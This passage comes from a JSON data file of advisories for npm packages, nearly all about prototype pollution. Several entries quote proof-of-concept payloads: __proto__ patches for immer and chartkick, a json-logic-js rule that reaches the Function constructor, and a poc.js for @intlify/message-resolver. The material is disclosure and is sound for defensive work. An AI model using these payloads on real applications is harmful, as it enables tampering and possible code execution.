      "date": "5 Feb 2025",
      "cve": "CVE-2024-57063",
      "year": 2024
   },
   {
      "package": {
         "raw": "php-parser@3.2.5",
         "name": "php-parser",
         "version": "3.2.5"
      },
      "id": "SNYK-JS-PHPPARSER-8709963",
      "description": "php-parser is a Parse PHP code from JS and returns its AST\nAffected versions of this package are vulnerable to Prototype Pollution in the combine() function.\n",
      "summary": "Prototype Pollution  Affecting php-parser package, versions *",
      "date": "5 Feb 2025",
      "cve": "CVE-2024-57071",
      "year": 2024
   },
   {
      "package": {
         "raw": "redoc@2.3.0",
         "name": "redoc",
         "version": "2.3.0"
      },
      "id": "SNYK-JS-REDOC-8664933",
      "description": "redoc is an OpenAPI/Swagger-generated API Reference Documentation.\nAffected versions of this package are vulnerable to Prototype Pollution via the mergeObjects() method in utils/helpers.ts due to improper user input sanitization.\n",
      "summary": "Prototype Pollution  Affecting redoc package, versions <2.4.0",
      "date": "28 Jan 2025",
      "cve": "CVE-2024-57083",
      "year": 2024
   },
   {
      "package": {
         "raw": "dot-properties@1.0.1",
         "name": "dot-properties",
         "version": "1.0.1"
      },
      "id": "SNYK-JS-DOTPROPERTIES-8706723",
      "description": "dot-properties is a Parse & stringify .properties files\nAffected versions of this package are vulnerable to Prototype Pollution through the lib.parse entry function. An attacker can disrupt service by supplying a crafted payload with Object.prototype setter to introduce or modify properties within the global prototype chain.\n",
      "summary": "Prototype Pollution  Affecting dot-properties package, versions <1.0.2",
      "date": "5 Feb 2025",
      "cve": "CVE-2024-57084",
      "year": 2024
   },
   {
      "package": {
         "raw": "ajax-request@1.2.3",
         "name": "ajax-request",
         "version": "1.2.3"
      },
      "id": "SNYK-JS-AJAXREQUEST-8706726",
      "description": "ajax-request is a Http request for nodejs, and it also support file download\nAffected versions of this package are vulnerable to Prototype Pollution through the lib.post function. An attacker can disrupt service by supplying a crafted payload with Object.prototype setter to introduce or modify properties within the global prototype chain.\n",
      "summary": "Prototype Pollution  Affecting ajax-request package, versions *",
      "date": "5 Feb 2025",
      "cve": "CVE-2024-57076",
      "year": 2024
   },
   {
      "package": {
         "raw": "underscore-contrib@0.3.0",
         "name": "underscore-contrib",
         "version": "0.3.0"
      },
      "id": "SNYK-JS-UNDERSCORECONTRIB-8706728",
      "description": "underscore-contrib is an underscore-contrib ==================\nAffected versions of this package are vulnerable to Prototype Pollution through the lib.fromQuery function. An attacker can disrupt service by supplying a crafted payload with Object.prototype setter to introduce or modify properties within the global prototype chain.\n",
      "summary": "Prototype Pollution  Affecting underscore-contrib package, versions *",
      "date": "5 Feb 2025",
      "cve": "CVE-2024-57081",
      "year": 2024
   },
   {
      "package": {
         "raw": "@syncfusion/ej2-spreadsheet@30.1.39",
         "name": "ej2-spreadsheet",
         "version": "30.1.39",
         "scope": "syncfusion"
      },
      "id": "SNYK-JS-SYNCFUSIONEJ2SPREADSHEET-8706813",
      "description": "@syncfusion/ej2-spreadsheet is a Feature-rich JavaScript Spreadsheet (Excel) control with built-in support for selection, editing, formatting, importing and exporting to Excel\nAffected versions of this package are vulnerable to Prototype Pollution via the setValue function. An attacker can disrupt service by supplying a crafted payload with Object.prototype setter to introduce or modify properties within the global prototype chain.\n",
      "summary": "Prototype Pollution  Affecting @syncfusion/ej2-spreadsheet package, versions *",
      "date": "5 Feb 2025",
      "cve": "CVE-2024-57064",
      "year": 2024
   },
   {
      "package": {
         "raw": "@tanstack/form-core@0.42.0",
         "name": "form-core",
         "version": "0.42.0",
         "scope": "tanstack"
      },
      "id": "SNYK-JS-TANSTACKFORMCORE-8706814",
      "description": "@tanstack/form-core is a Powerful, type-safe, framework agnostic forms.\nAffected versions of this package are vulnerable to Prototype Pollution through the mutateMergeDeep function. An attacker can disrupt service by supplying a crafted payload with Object.prototype setter to introduce or modify properties within the global prototype chain.\n",
      "summary": "Prototype Pollution  Affecting @tanstack/form-core package, versions <0.42.1",
      "date": "5 Feb 2025",
      "cve": "CVE-2024-57068",
      "year": 2024
   },
   {
      "package": {
         "raw": "xe-utils@3.7.1",
         "name": "xe-utils",
         "version": "3.7.1"
      },
      "id": "SNYK-JS-XEUTILS-8708047",
      "description": "xe-utils is a JavaScript 函数库、工具类\nAffected versions of this package are vulnerable to Prototype Pollution through the merge() function.\n",
      "summary": "Prototype Pollution  Affecting xe-utils package, versions <3.7.2",
      "date": "5 Feb 2025",
      "cve": "CVE-2024-57074",
      "year": 2024
   },
   {
      "package": {
         "raw": "lodash.zipobjectdeep@4.4.2",
         "name": "lodash.zipobjectdeep",
         "version": "4.4.2"
      },
      "id": "SNYK-JS-LODASHZIPOBJECTDEEP-6139238",
      "description": "lodash.zipobjectdeep is a The lodash method _.zipObjectDeep exported as a module.\nAffected versions of this package are vulnerable to Prototype Pollution through the zipObjectDeep function due to improper user input sanitization in the baseZipObject function.\nNote\nlodash.setwith is not maintained for a long time. It is recommended to use lodash library, which contains the fix since version 4.17.17.\n",
      "summary": "Prototype Pollution  Affecting lodash.zipobjectdeep package, versions *",
      "date": "23 Dec 2023",
      "year": 2023
   },
   {
      "package": {
         "raw": "gsap@3.5.1",
         "name": "gsap",
         "version": "3.5.1"
      },
      "id": "GHSA-6g8v-hpgw-h2v7",
      "description": "There is a prototype pollution vulnerability in gsap which affects all versions before 3.6.0.",
      "summary": "Prototype pollution in gsap",
      "date": "2021-01-20T21:21:50Z",
      "cve": "CVE-2020-28478",
      "year": 2020
   },
   {
      "package": {
         "raw": "node-forge@0.9.2",
         "name": "node-forge",
         "version": "0.9.2"
      },
      "id": "GHSA-wxgw-qj99-44c2",
      "description": "### Impact\n`forge.util.setPath` had a potential prototype pollution issue if called with untrusted keys. This API was not used by forge itself.\n\n### Patches\nThe `forge.util.setPath` API and related functions were removed in 0.10.0.\n\n### Workarounds\nDon't call `forge.util.setPath` directly or indirectly with untrusted keys.\n\n### References\n- https://security.snyk.io/vuln/SNYK-JS-NODEFORGE-598677\n- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7720\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [forge](https://github.com/digitalbazaar/forge).\n* Email us at support@digitalbazaar.com.",
      "summary": "Prototype Pollution in node-forge util.setPath API",
      "date": "2022-01-08T00:22:40Z",
      "cve": null,
      "year": 2022
   },
   {
      "package": {
         "raw": "config-handler@2.0.3",
         "name": "config-handler",
         "version": "2.0.3"
      },
      "id": "GHSA-2w3f-9w3q-qw77",
      "description": "All versions of package config-handler are vulnerable to Prototype Pollution when loading config files.",
      "summary": "Prototype Pollution in config-handler",
      "date": "2021-10-12T18:30:37Z",
      "cve": "CVE-2021-23448",
      "year": 2021
   },
   {
      "package": {
         "raw": "klona@1.1.0",
         "name": "klona",
         "version": "1.1.0"
      },
      "id": "GHSA-8f89-2fwj-5v5r",
      "description": "Flaw in input validation in npm package klona version 1.1.0 and earlier may allow prototype pollution attack that may result in remote code execution or denial of service of applications using klona.",
      "summary": "Improper Input Validation in klona",
      "date": "2021-04-13T15:41:24Z",
      "cve": "CVE-2020-8125",
      "year": 2020
   },
   {
      "package": {
         "raw": "dotty@0.1.0",
         "name": "dotty",
         "version": "0.1.0"
      },
      "id": "GHSA-f5c9-x9j6-87qp",
      "description": "Prototype pollution vulnerability in 'dotty' before version 0.1.1 allows attackers to cause a denial of service and may lead to remote code execution.",
      "summary": "Prototype pollution in dotty",
      "date": "2021-02-05T20:43:08Z",
      "cve": "CVE-2021-25912",
      "year": 2021
   },
   {
      "package": {
         "raw": "immer@8.0.0",
         "name": "immer",
         "version": "8.0.0"
      },
      "id": "GHSA-9qmh-276g-x5pj",
      "description": "## Overview\n\nAffected versions of immer are vulnerable to Prototype Pollution.\n\n## Proof of exploit\n\n```js\nconst {applyPatches, enablePatches} = require(\"immer\");\nenablePatches();\nlet obj = {};\nconsole.log(\"Before : \" + obj.polluted);\napplyPatches({}, [ { op: 'add', path: [ \"__proto__\", \"polluted\" ], value: \"yes\" } ]);\n// applyPatches({}, [ { op: 'replace', path: [ \"__proto__\", \"polluted\" ], value: \"yes\" } ]);\nconsole.log(\"After : \" + obj.polluted);\n```\n\n## Remediation\n\nVersion 8.0.1 contains a [fix](https://github.com/immerjs/immer/commit/da2bd4fa0edc9335543089fe7d290d6a346c40c5) for this vulnerability, updating is recommended.",
      "summary": "Prototype Pollution in immer",
      "date": "2021-01-20T21:27:56Z",
      "cve": "CVE-2020-28477",
      "year": 2020
   },
   {
      "package": {
         "raw": "jointjs@3.2.0",
         "name": "jointjs",
         "version": "3.2.0"
      },
      "id": "GHSA-qwp9-52h8-xgg8",
      "description": "The package jointjs before 3.3.0 are vulnerable to Prototype Pollution via util.setByPath (https://resources.jointjs.com/docs/jointjs/v3.2/joint.htmlutil.setByPath). The path used the access the object's key and set the value is not properly sanitized, leading to a Prototype Pollution.",
      "summary": "Prototype pollution in JointJS",
      "date": "2021-01-20T21:21:16Z",
      "cve": "CVE-2020-28480",
      "year": 2020
   },
   {
      "package": {
         "raw": "json-logic-js@1.2.3",
         "name": "json-logic-js",
         "version": "1.2.3"
      },
      "id": "GHSA-m9hw-7xfv-wqg7",
      "description": "Versions of json-logic-js prior to 2.0.0 are vulnerable to Prototype Pollution. The method operation allows a malicious user to modify the prototype of Object through the method property name. This causes modification of any existing property that will exist on all objects and leads to Remote Code Execution.\n\nThe following rule creates a popup when run from a browser:\n```\n{\n  \"method\": [\n    {\n      \"method\": [\n        {\n          \"var\": \"__proto__.constructor.is.__proto__\"\n        },\n        \"constructor\",\n        [\n          \"var x = 'SECURITY!'; console.log(x, window.fetch); alert(x)\"\n        ]\n      ]\n    },\n    \"call\"\n  ]\n}\n```",
      "summary": "Prototype Pollution in json-logic-js",
      "date": "2020-11-12T19:36:14Z",
      "cve": null,
      "year": 2020
   },
   {
      "package": {
         "raw": "chartkick@3.2.1",
         "name": "chartkick",
         "version": "3.2.1"
      },
      "id": "GHSA-5pm8-492c-92p5",
      "description": "Affected versions of `@polymer/polymer` are vulnerable to prototype pollution. The package fails to prevent modification of object prototypes through chart options containing a payload such as `{\"__proto__\": {\"polluted\": true}}`. It is possible to achieve the same results if a chart loads data from a malicious server.\n\n\n## Recommendation\n\nUpgrade to version 3.2.0 or later.",
      "summary": "Prototype Pollution in chartkick",
      "date": "2019-12-02T18:04:11Z",
      "cve": "CVE-2019-18841",
      "year": 2019
   },
   {
      "package": {
         "raw": "handlebars@4.1.1",
         "name": "handlebars",
         "version": "4.1.1"
      },
      "id": "GHSA-q42p-pg8m-cqh6",
      "description": "Versions of `handlebars` prior to 4.0.14 are vulnerable to Prototype Pollution. Templates may alter an Objects' prototype, thus allowing an attacker to execute arbitrary code on the server.\n\n\n## Recommendation\n\nFor handlebars 4.1.x upgrade to 4.1.2 or later.\nFor handlebars 4.0.x upgrade to 4.0.14 or later.",
      "summary": "Prototype Pollution in handlebars",
      "date": "2019-06-05T14:07:48Z",
      "cve": null,
      "year": 2019
   },
   {
      "package": {
         "raw": "merge-deep@3.0.0",
         "name": "merge-deep",
         "version": "3.0.0"
      },
      "id": "GHSA-9g9w-hmvj-5h57",
      "description": "Versions of `merge-deep` before 3.0.1 are vulnerable to prototype pollution via merging functions.\n\n\n## Recommendation\n\nUpdate to version 3.0.1 or later.",
      "summary": "Prototype Pollution in merge-deep",
      "date": "2018-07-26T15:17:15Z",
      "cve": "CVE-2018-3722",
      "year": 2018
   },
   {
      "package": {
         "raw": "canvg@4.0.2",
         "name": "canvg",
         "version": "4.0.2"
      },
      "id": "GHSA-v2mw-5mch-w8c5",
      "description": "An issue in canvg prior to v.4.0.3 and v3.0.11 can lead to prototype pollution via the Constructor of the class StyleElement.",
      "summary": "canvg Prototype Pollution vulnerability",
      "date": "2025-03-10T18:31:56Z",
      "cve": "CVE-2025-25977",
      "year": 2025
   },
   {
      "package": {
         "raw": "@intlify/message-resolver@9.1.10",
         "name": "message-resolver",
         "version": "9.1.10",
         "scope": "intlify"
      },
      "id": "GHSA-p2ph-7g93-hw3m",
      "description": "**Vulnerability type:**\nPrototype Pollution\n\n**Vulnerability Location(s):**\n```js\n# v9.1\nnode_modules/@intlify/message-resolver/index.js\n\n# v9.2 or later\nnode_modules/@intlify/vue-i18n-core/index.js\n```\n\n**Description:**\n\nThe latest version of `@intlify/message-resolver (9.1)` and `@intlify/vue-i18n-core (9.2 or later)`, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) `handleFlatJson`. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.\n\nMoreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.\n\n\n**PoC:**\n\n```bash\n// install the package with the latest version\n~$ npm install @intlify/message-resolver@9.1.10\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n```\n\n```js\n// poc.js\n(async () => {\n    const lib = await import('@intlify/message-resolver');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        lib.handleFlatJson ({ \"__proto__.pollutedKey\": \"pollutedValue\" })\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\n```",
      "summary": "Vue I18n Allows Prototype Pollution in `handleFlatJson`",
      "date": "2025-03-07T15:58:24Z",
      "cve": "CVE-2025-27597",
      "year": 2025
   },
   {
      "package": {
         "raw": "@abip/sp-common@0.5.4",
         "name": "sp-common",
         "version": "0.5.4",
         "scope": "abip"
      },
      "id": "SNYK-JS-ABIPSPCOMMON-7417996",
      "description": "@abip/sp-common is a This repository contains common constants, functions, types, ... of the Service Control Panel (SCP).\nAffected versions of this package are vulnerable to Prototype Pollution in the mergeDeep() function.\n",
      "summary": "Prototype Pollution  Affecting @abip/sp-common package, versions *",
      "date": "1 Jul 2024",
      "cve": "CVE-2024-38990",
      "year": 2024
   },
   {
      "package": {
         "raw": "@agreejs/shared@0.0.1",
         "name": "shared",
         "version": "0.0.1",
         "scope": "agreejs"
      },
      "id": "SNYK-JS-AGREEJSSHARED-7417398",
      "description": "@agreejs/shared is a > TODO: description\nAffected versions of this package are vulnerable to Prototype Pollution in the mergeInternalComponents() function.\n",
      "summary": "Prototype Pollution  Affecting @agreejs/shared package, versions *",
      "date": "1 Jul 2024",
      "cve": "CVE-2024-39017",
      "year": 2024
   },
   {
      "package": {
         "raw": "@chasemoskal/snapstate@0.0.9",
         "name": "snapstate",
         "version": "0.0.9",
         "scope": "chasemoskal"
      },
      "id": "SNYK-JS-CHASEMOSKALSNAPSTATE-7575313",
      "description": "@chasemoskal/snapstate is a tiny robust state management\nAffected versions of this package are vulnerable to Prototype Pollution via the attemptNestedProperty function. An attacker can execute arbitrary code or disrupt service by injecting arbitrary properties.\n",
      "summary": "Prototype Pollution  Affecting @chasemoskal/snapstate package, versions *",
      "date": "30 Jul 2024",
      "cve": "CVE-2024-39010",
      "year": 2024
   },
   {
      "package": {
         "raw": "2o3t-utility@0.1.2",
         "name": "2o3t-utility",
         "version": "0.1.2"
      },
      "id": "SNYK-JS-2O3TUTILITY-7417404",
      "description": "2o3t-utility is a 2o3t.cn --> Utility, a simple utils.\nAffected versions of this package are vulnerable to Prototype Pollution via the extend function. An attacker can execute arbitrary code or cause a system crash by injecting arbitrary properties into objects.\n",
      "summary": "Prototype Pollution  Affecting 2o3t-utility package, versions *",
      "date": "1 Jul 2024",
      "cve": "CVE-2024-39013",
      "year": 2024
   }
]